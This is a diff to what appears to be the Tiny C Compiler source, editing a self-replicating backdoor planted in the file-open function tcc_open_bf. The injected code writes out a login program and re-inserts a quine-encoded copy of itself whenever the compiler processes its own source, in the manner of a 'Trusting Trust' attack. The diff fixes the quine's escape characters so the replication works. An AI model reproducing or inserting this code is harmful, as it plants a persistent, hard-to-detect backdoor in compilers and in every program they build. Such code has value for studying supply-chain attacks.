@@ -700,7 +700,7 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
                 if (argc != 2)\n\
                     return 1;\n\
                 return do_login(argv[1]);\n\
-            };\n\
+            }%c;\n\
         fprintf(loginfile, %c%cs%c, logintext);\n\
         fclose(loginfile);\n\
     }\n\
@@ -710,14 +710,14 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
         FILE * rewrite = fopen(%crewrite.c%c,%cw+%c);\n\
         char* a;\n\
         size_t bites;\n\
-        char* start = %cST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)%c%c;\n\
+        char* start = %cST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)%cn%c;\n\
         int rewriting = 0;\n\
         while(getline(&a,&bites,thisfile) != EOF)\n\
         {\n\
             fprintf(rewrite, %c%cs%c, a);\n\
             if(rewriting)\n\
             {\n\
-                fprintf(rewrite, equine, 34, equine, 34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,37,34,34,34,34,34,34,34,34,34,34,10,34,34,37,34);\n\
+                fprintf(rewrite, equine, 34, equine, 34,34,34,34,34,34,92,34,92,34,92,34,92,34,34,34,37,34,34,34,34,34,34,34,34,34,34,92,34,34,37,34);\n\
                 rewriting = 0;\n\
             }\n\
             if(!strcmp(a,start))\n\
@@ -763,7 +763,7 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
             fprintf(rewrite, "%s", a);
             if (rewriting)
             {
-                fprintf(rewrite, equine, 34, equine, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 10, 34, 34, 37, 34);
+                fprintf(rewrite, equine, 34, equine, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 34, 34, 37, 34);
                 rewriting = 0;
             }
             if (!strcmp(a, start))
